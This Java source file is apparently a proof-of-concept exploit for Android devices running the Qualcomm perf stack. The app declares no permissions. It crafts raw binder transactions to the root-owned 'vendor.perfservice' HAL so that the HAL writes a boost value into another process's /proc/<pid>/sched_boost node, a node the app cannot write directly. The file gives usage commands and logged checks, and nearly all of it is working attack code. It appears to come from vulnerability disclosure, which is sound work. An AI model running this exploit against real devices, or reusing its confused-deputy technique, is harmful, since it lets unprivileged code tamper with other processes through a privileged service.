/*
 * PerfservicePrivilegePoC.java — minimal, self-contained proof of concept
 *
 * Demonstrates: an unprivileged Android application (no declared permissions) can make the
 * root-owned perf HAL write a privileged value into a *target process*'s kernel node, while the
 * application itself cannot even open that node.
 *
 * Usage (device with the Qualcomm perf stack, `vendor.perfservice` present):
 *   adb install poc.apk
 *   # pick a victim pid (any process other than the PoC itself), e.g.:
 *   adb shell 'nohup sleep 300 >/dev/null 2>&1 & echo $!'        -> VICTIM_PID
 *   adb shell 'cat /proc/VICTIM_PID/sched_boost'                  -> 0   (baseline)
 *   adb shell am start -n com.example.perfpoc/.MainActivity --ei tgt VICTIM_PID
 *   adb shell 'cat /proc/VICTIM_PID/sched_boost'                  -> 3   (after)
 *
 * Expected logcat output is dumped under tag "PERFPOC".
 *
 * No Qualcomm client library is used: the binder transaction is constructed by hand.
 */

package com.example.perfpoc;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;
import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.FileReader;

public class MainActivity extends Activity {

    private static final String TAG = "PERFPOC";

    /* IPerfManager transaction codes (FIRST_CALL_TRANSACTION == 1) */
    private static final int T_PERF_LOCK_RELEASE = 1;
    private static final int T_PERF_LOCK_ACQUIRE = 4;
    private static final int T_PERF_HAL_VER      = 12;
    private static final String IFACE = "com.qualcomm.qti.IPerfManager";

    /* major 3 / minor 0x20 -> node template "/proc/%d/sched_boost" (see /vendor/etc/perf/*.xml) */
    private static final int OP_SCHED_TASK_BOOST = 0x40C80000;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        int tgt = (getIntent() != null) ? getIntent().getIntExtra("tgt", -1) : -1;

        log("[i] myUid=" + android.os.Process.myUid() + " myPid=" + android.os.Process.myPid()
                + " targetPid=" + tgt + (tgt <= 0 ? "  (pass --ei tgt <pid>)" : ""));

        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            IBinder svc = (IBinder) sm.getMethod("getService", String.class)
                                       .invoke(null, "vendor.perfservice");
            log("[1] getService(vendor.perfservice) = " + svc);
            if (svc == null) return;
            log("[2] interfaceDescriptor = " + svc.getInterfaceDescriptor());

            /* ---- read-only probe: server really executes our call ---- */
            Parcel d = Parcel.obtain(), r = Parcel.obtain();
            d.writeInterfaceToken(IFACE);
            boolean ok = svc.transact(T_PERF_HAL_VER, d, r, 0);
            r.readException();
            log("[3] transact(12/*getPerfHalVer*/) ok=" + ok + " -> " + r.readDouble());

            /* ---- no-argument call proves reachability without side effects ---- */
            Parcel d1 = Parcel.obtain(), r1 = Parcel.obtain();
            d1.writeInterfaceToken(IFACE);
            boolean ok1 = svc.transact(T_PERF_LOCK_RELEASE, d1, r1, 0);
            r1.readException();
            log("[4] transact(1/*perfLockRelease*/) ok=" + ok1 + " -> " + r1.readInt());

            if (tgt <= 0) { log("[5] no target pid supplied, stopping after reachability check"); return; }

            String node = "/proc/" + tgt + "/sched_boost";

            /* ---- control: the app itself cannot touch the node ---- */
            log("[6] direct read  " + node + " -> " + read(node));
            try {
                FileOutputStream fo = new FileOutputStream(node);
                fo.write("3\n".getBytes()); fo.flush(); fo.close();
                log("[7] direct WRITE succeeded (unexpected)");
            } catch (Throwable t) {
                log("[7] direct write denied -> " + t);
            }

            /* ---- exploitation: ask the root HAL to do it for us ----
             * parcel layout read by BnPerfManager::onTransact:  duration, len, len, data...
             * (the second len is written by writeInt32Array) */
            Parcel d2 = Parcel.obtain(), r2 = Parcel.obtain();
            d2.writeInterfaceToken(IFACE);
            d2.writeInt(0);                                     /* duration: 0 = hold */
            d2.writeInt(2);                                     /* len placeholder */
            d2.writeIntArray(new int[] { OP_SCHED_TASK_BOOST, tgt });
            boolean ok2 = svc.transact(T_PERF_LOCK_ACQUIRE, d2, r2, 0);
            r2.readException();
            log("[8] transact(4/*perfLockAcquire*/) ok=" + ok2 + " handle=" + r2.readInt());

            Thread.sleep(1000);
            log("[9] after the HAL write, node content (unreadable from here normally) -> " + read(node));
            log("[+] verify from a shell:  cat " + node + "   (expect 3)");
        } catch (Throwable t) {
            log("[!] " + t);
        }
    }

    private String read(String p) {
        try {
            BufferedReader br = new BufferedReader(new FileReader(p));
            String s = br.readLine(); br.close();
            return String.valueOf(s);
        } catch (Throwable t) {
            return "unreadable (" + t + ")";
        }
    }

    private void log(String s) { Log.i(TAG, s); }
}
